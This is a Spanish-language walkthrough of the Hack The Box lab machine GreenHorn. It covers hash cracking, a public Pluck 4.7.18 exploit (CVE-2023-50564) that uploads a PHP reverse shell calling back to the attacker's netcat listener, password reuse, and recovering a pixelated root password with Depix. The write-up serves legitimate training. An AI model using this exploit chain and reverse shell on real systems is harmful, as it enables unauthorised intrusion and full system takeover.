---
title : "GreenHorn CTF Walkthrough"
date: 2024-07-29 02:42:42 +0200
categories: [CTF Walkthrough]
tags: [CTF,Walkthrough, Hack The Box]
---

![greenhorn-header](/assets/post_img/Greenhorn/icon.png)

Comenzaremos el _Walkthrough_ de la máquina **GreenHorn** de Hack The Box comprobando la conexión con la máquina a vulnerar realizando un __ping__:

```bash
┌──(kali㉿kali)-[~/HTB/GreenHorn]
└─$ ping -c 4 10.10.11.25    
PING 10.10.11.25 (10.10.11.25) 56(84) bytes of data.
64 bytes from 10.10.11.25: icmp_seq=1 ttl=63 time=44.3 ms
64 bytes from 10.10.11.25: icmp_seq=2 ttl=63 time=44.2 ms
64 bytes from 10.10.11.25: icmp_seq=3 ttl=63 time=1810 ms
64 bytes from 10.10.11.25: icmp_seq=4 ttl=63 time=827 ms

--- 10.10.11.25 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3030ms
rtt min/avg/max/mdev = 44.223/681.403/1810.196/725.813 ms, pipe 2
```

Seguimos con la fase de escaneo de puertos usando la herramienta **Rustscan**. En este caso usamos el siguiente comando para comprobar y analizar los puertos abiertos, viendo así que hay tres puertos disponibles: dos HTTP y un SSH.
```bash
┌──(kali㉿kali)-[~/HTB/GreenHorn]
└─$ rustscan -a 10.10.11.25 -- -sCV     
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.25:22
Open 10.10.11.25:80
Open 10.10.11.25:3000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~][~][~][~][~][~][~][~][~][~][~][~][~][~][~][~][~][~][~][~]

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOp+cK9ugCW282Gw6Rqe+Yz+5fOGcZzYi8cmlGmFdFAjI1347tnkKumDGK1qJnJ1hj68bmzOONz/x1CMeZjnKMw=
|   256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZQbCc8u6r2CVboxEesTZTMmZnMuEidK9zNjkD2RGEv
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
3000/tcp open  ppp?    syn-ack
```

En el puerto 80 podemos observar: *"http-title: Did not follow redirect to http://greenhorn.htb/"*, así que añadiremos la dirección IP y el dominio en el fichero /etc/hosts. Esto permitirá que el sistema resuelva "greenhorn.htb" a la dirección IP correcta.
```bash
┌──(kali㉿kali)-[~/HTB/GreenHorn]
└─$ sudo bash -c 'echo "10.10.11.25 greenhorn.htb" >> /etc/hosts'
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/GreenHorn]
└─$ cat /etc/hosts                                         
127.0.0.1       localhost
127.0.1.1       kali.kali       kali
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.11.25 greenhorn.htb
```

Primero haremos una visita a la web que corre por el puerto 80 donde vemos una bienvenida. Haciendo *Hovering* observamos que **admin** nos lleva a una página de login.php.

![x](/assets/post_img/Greenhorn/1-admin_login.png)

Intentamos autenticarnos con las credenciales por defecto o más comunes y no da resultado, así que identificaremos las tecnologías y sus versiones, en búsqueda de posibles vulnerabilidades. 

![Login](/assets/post_img/Greenhorn/2-login.php.png)

Encontramos vulnerabilidades que mencionan un RCE (Remote Code Execution), pero la mayoría de ellas son con autorización en el CMS llamado Pluck. 

![x](/assets/post_img/Greenhorn/3-cms_v.png)

Ya que no encontramos nada más en la web corriendo por el puerto 80, vamos a observar la del puerto 3000. 

Vemos que esta web está hosteada por Gitea, un servicio de Git. Haciendo clic en "Explore", veremos un repositorio donde me llamó la atención una parte del código que menciona dos archivos: **pass.php** y **token.php**.

![x](/assets/post_img/Greenhorn/3.1-gitea.png)
![x](/assets/post_img/Greenhorn/4-code.png)

Vemos un hash en el archivo **pass.php**, el cual crackearemos encontrando así una potencial contraseña: **iloveyou1**.

![x](/assets/post_img/Greenhorn/5-pass.png)
![x](/assets/post_img/Greenhorn/6-%20hashed.png)

Una vez intentamos autenticarnos con la contraseña **iloveyou1** habremos iniciado sesión en el login.php de Pluck. Una vez ya dentro, volvemos a los exploits que hay para Pluck 4.7.18 para acceder al sistema.

![x](/assets/post_img/Greenhorn/7-login-correcto.png)

En este caso usaremos el repositorio llamado [CVE-2023-50564_Pluck-v4.7.18_PoC](https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC) de Rai2en. 

![x](/assets/post_img/Greenhorn/8.png)

Clonaremos este repositorio en nuestro directorio de trabajo y lo organizaremos a nuestro gusto. En mi caso, puse un nombre más simple y le di permisos de ejecución a los archivos con extensión **py**.

```bash
┌──(kali㉿kali)-[~/HTB/GreenHorn/exploits]
└─$ git clone https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC.git         
Cloning into 'CVE-2023-50564_Pluck-v4.7.18_PoC'...
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 17 (delta 1), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (17/17), 12.58 KiB | 62.00 KiB/s, done.
Resolving deltas: 100% (1/1), done.
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/GreenHorn/exploits]
└─$ mv CVE-2023-50564_Pluck-v4.7.18_PoC Pluck-4.7.18
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/GreenHorn/exploits]
└─$ cd Pluck-4.7.18 
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/GreenHorn/exploits/Pluck-4.7.18]
└─$ chmod +x *.py      
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/GreenHorn/exploits/Pluck-4.7.18]
└─$ ls -l 
total 24
-rw-rw-r-- 1 kali kali 1732 Jul 24 17:46 README.md
-rwxrwxr-x 1 kali kali 1262 Jul 24 17:46 poc.py
-rw-rw-r-- 1 kali kali 9318 Jul 24 17:46 shell.php
-rw-rw-r-- 1 kali kali 2693 Jul 24 17:46 shell.rar
```

De la _Reverse Shell_ debemos realizar dos pequeños cambios: nuestra dirección IP y el puerto que estará en escucha con **netcat/nc** para realizar la conexión.

```php
...
...
...

echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.10.14.207', 8043);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>

```
Lo siguiente es modificar el exploit llamado "Poc.py", donde le añadiremos el hostname "greenhorn" para completar la URL correctamente.

```python
Replace <hostname>
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

login_url = "http://greenhorn.htb/login.php"
upload_url = "http://greenhorn.htb/admin.php?action=installmodule"

...
...
...
```
Seguimos con la creación de un archivo ZIP para poder inyectar el RCE de manera correcta, ya que el _file upload form_ solo acepta los archivos ZIP.

```bash
┌──(kali㉿kali)-[~/HTB/GreenHorn/exploits/Pluck-4.7.18]
└─$ zip -q shell.zip shell.php 
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/GreenHorn/exploits/Pluck-4.7.18]
└─$ ls *.zip
shell.zip
```
En este punto ejecutaremos el exploit teniendo el **Netcat** en escucha para realizar la _Reverse Shell_. Este exploit en concreto se ejecuta indicando los parámetros: **python3 _[exploit]_.py _[zip-file]_.zip**.
```bash 
┌──(kali㉿kali)-[~/HTB/GreenHorn/exploits/Pluck-4.7.18]
└─$ sudo nc -nlvp 8043
listening on [any] 8043 ...

------------------------------------------------------------------------------

┌──(kali㉿kali)-[~/HTB/GreenHorn/exploits/Pluck-4.7.18]
└─$ python3 poc.py
ZIP file path: shell.zip
Login account
ZIP file download.

------------------------------------------------------------------------------

┌──(kali㉿kali)-[~/HTB/GreenHorn/exploits/Pluck-4.7.18]
└─$ sudo nc -nlvp 8043
listening on [any] 8043 ...
connect to [10.10.14.207] from (UNKNOWN) [10.10.11.25] 59398
SOCKET: Shell has connected! PID: 2561
whoami
www-data
```
¡Perfecto, tenemos acceso a la máquina! Somos el usuario **www-data** así que nuestro trabajo es elevar privilegios. Al ser una _Reverse Shell_, la shell no es interactiva, así que trataremos la **TTY**. Esta es la metodología que empleo personalmente, así que dejo el listado de comandos a ejectutar:

```bash
[+] script /dev/null -c bash  # Lanza pseudoconsola
[+] [ctrl+z]  # Suspende la shell actual
[+] stty raw -echo; fg  # Recupera la shell suspendida
[+] reset   # Reinicia la configuración de la terminal
[+] xterm   # Especifica el tipo de terminal a la pregunta de "Terminal type?"
[+] export TERM=xterm   # Asigna xterm a la variable TERM
[+] export SHELL=bash   # Asigna bash a la variable SHELL
[+] stty rows <VALOR_FILAS> columns <VALOR_COLUMNAS>  # En mi caso 56 y 236 consultando la stty size de mi terminal
```

En la línea de comandos lo veremos de esta manera:
```bash
script /dev/null -c bash
www-data@greenhorn:$ ^Z
zsh: suspended  sudo nc -nlvp 8043
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/GreenHorn/exploits/Pluck-4.7.18]
└─$ stty raw -echo; fg
[1]  + continued  sudo nc -nlvp 8043
                                    reset
reset: unknown terminal type unknown
Terminal type? xterm
www-data@greenhorn:$ export TERM=xterm
www-data@greenhorn:$ export SHELL=bash
www-data@greenhorn:$ stty rows 56 columns 237
```
Observando el directorio **/home** vemos que se encuentran dos usuarios, por lo tanto, probamos de autenticarnos con la contraseña **iloveyou1** anteriormente encontrada. El resultado es la autenticación exitosa con **junior**, pudiendo así conseguir la **_user flag_**.
```bash
www-data@greenhorn:/home$ ls -l
ls -l
total 8
drwxr-x--- 2 git    git    4096 Jun 20 06:36 git
drwxr-xr-x 3 junior junior 4096 Jun 20 06:36 junior
www-data@greenhorn:/home$ su junior
Password: 
junior@greenhorn:/home$ whoami
junior
junior@greenhorn:/home$ cat junior/user.txt 
db0b2f9c705bbbd5653b43293582e74f
```
Como vemos en los archivos que contiene **/home/junior**, vemos un PDF que puede ser útil. En este caso, levanto un *http.server* con python3 por el puerto 8000 para acceder vía HTTP desde nuestra máquina amfitrión.  
```bash
junior@greenhorn:~$ ls -la
total 76
drwxr-xr-x 3 junior junior  4096 Jun 20 06:36  .
drwxr-xr-x 4 root   root    4096 Jun 20 06:36  ..
lrwxrwxrwx 1 junior junior     9 Jun 11 14:38  .bash_history -> /dev/null
drwx------ 2 junior junior  4096 Jun 20 06:36  .cache
-rw-r----- 1 root   junior    33 Jul 24 17:20  user.txt
-rw-r----- 1 root   junior 61367 Jun 11 14:39 'Using OpenVAS.pdf'

junior@greenhorn:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.207 - - [24/Jul/2024 17:38:44] "GET / HTTP/1.1" 200 -
```
Accediendo al *Directory List* que hemos levantado, nos descargaremos el archivo llamado *"Using OpenVAS.pdf"* y nos encontramos con una carta, donde podemos observar una posible contraseña root, pero está pixelada.

![x](/assets/post_img/Greenhorn/9-pdf.png)

Para este caso hay una herramienta muy interesante llamada Depix que podemos encontrar en [Github - Depix](https://github.com/spipm/Depix) creada por Spipm:

![x](/assets/post_img/Greenhorn/8.5-Depix.png)

Para usar Depix primero necesitaremos **_poppler-utils_**, una biblioteca que permite renderizar archivos PDF. Lo siguiente es ejecutar **pdfimages** para extraer el PDF a PPM (Portable Pixmap). El archivo de salida se llamará "passwd" con su extensión .ppm.
```bash
┌──(kali㉿kali)-[~/HTB/GreenHorn/content]
└─$ sudo apt install poppler-utils            
[sudo] password for kali: 
Installing:
  poppler-utils
...
...
...

┌──(kali㉿kali)-[~/HTB/GreenHorn/content]
└─$ pdfimages ./Using\ OpenVAS.pdf passwd
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/GreenHorn/content]
└─$ ls
 Depix  'Using OpenVAS.pdf'   passwd-000.ppm

```

Teniendo el archivo .ppm necesario, haremos el **git clone** del repositorio Depix: 

```bash
┌──(kali㉿kali)-[~/HTB/GreenHorn/content]
└─$ git clone https://github.com/spipm/Depix.git                            
Cloning into 'Depix'...
remote: Enumerating objects: 250, done.
remote: Counting objects: 100% (77/77), done.
remote: Compressing objects: 100% (42/42), done.
remote: Total 250 (delta 43), reused 53 (delta 33), pack-reused 173
Receiving objects: 100% (250/250), 851.45 KiB | 4.89 MiB/s, done.
Resolving deltas: 100% (115/115), done.

┌──(kali㉿kali)-[~/HTB/GreenHorn/content]
└─$ cd Depix
```

Una vez clonado el repositorio y situados en el directorio, ejecutaremos el script "Depix.py" con los siguientes parámetros para despixelar correctamente la contraseña:
```bash
┌──(kali㉿kali)-[~/HTB/GreenHorn/content/Depix]
└─$ python3 depix.py \
> -p ../passwd-000.ppm \
> -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
> -o passwd.png
2024-07-24 20:09:00,342 - Loading pixelated image from ../passwd-000.ppm
2024-07-24 20:09:00,349 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-07-24 20:09:01,005 - Finding color rectangles from pixelated space
2024-07-24 20:09:01,006 - Found 252 same color rectangles
2024-07-24 20:09:01,007 - 190 rectangles left after moot filter
2024-07-24 20:09:01,007 - Found 1 different rectangle sizes
2024-07-24 20:09:01,007 - Finding matches in search image
2024-07-24 20:09:01,007 - Scanning 190 blocks with size (5, 5)
2024-07-24 20:09:01,033 - Scanning in searchImage: 0/1674
2024-07-24 20:09:48,092 - Removing blocks with no matches
2024-07-24 20:09:48,092 - Splitting single matches and multiple matches
2024-07-24 20:09:48,096 - [16 straight matches | 174 multiple matches]
2024-07-24 20:09:48,096 - Trying geometrical matches on single-match squares
2024-07-24 20:09:48,413 - [29 straight matches | 161 multiple matches]
2024-07-24 20:09:48,413 - Trying another pass on geometrical matches
2024-07-24 20:09:48,685 - [41 straight matches | 149 multiple matches]
2024-07-24 20:09:48,685 - Writing single match results to output
2024-07-24 20:09:48,686 - Writing average results for multiple matches to output
2024-07-24 20:09:51,363 - Saving output image to: p

┌──(kali㉿kali)-[~/HTB/GreenHorn/content/Depix]
└─$ ls *.png
passwd.png
```
El resultado es un archivo llamado por nosotros mismos "passwd.png" y abriéndolo con el comando **open** veremos el resultado de la despixelación.
```bash
┌──(kali㉿kali)-[~/HTB/GreenHorn/content/Depix]
└─$ open passwd.png
```
![x](/assets/post_img/Greenhorn/10-passwd.png)

Finalmente, probaremos el *string: __sidefromsidetheothersidesidefromsidetheotherside__* como contraseña para el usuario root, realizando así la elevación de privilegios exitosamente y encontrando la **_root flag_**!
```bash
www-data@greenhorn:~$ su
Password: 
root@greenhorn:~$ whoami
root
root@greenhorn:~# cat /root/root.txt 
0ae99170f57e4523bad3bb213430309e
```
![x](/assets/post_img/Greenhorn/11-machine.png)

¡Gracias por haber llegado hasta el final, espero que os haya gustado mi primer Walkthrough!

Hasta la próxima,

~loh♡.